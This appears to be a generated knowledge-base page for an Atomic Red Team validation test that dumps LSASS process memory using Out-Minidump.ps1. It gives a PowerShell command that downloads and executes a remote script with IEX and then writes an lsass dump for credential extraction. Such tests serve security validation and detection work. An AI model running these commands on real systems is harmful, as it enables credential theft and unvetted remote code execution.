---
atomic_guid: "6502c8f0-b775-4dbd-9193-1298f56b6781"
title: "Dump LSASS.exe Memory using Out-Minidump.ps1"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "6502c8f0-b775-4dbd-9193-1298f56b6781"
  - "Dump LSASS.exe Memory using Out-Minidump.ps1"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Dump LSASS.exe Memory using Out-Minidump.ps1

The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.

Author of Out-Minidump: Matthew Graeber (@mattifestation)

## Metadata

- Atomic GUID: 6502c8f0-b775-4dbd-9193-1298f56b6781
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump
```

### Cleanup

```powershell
Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
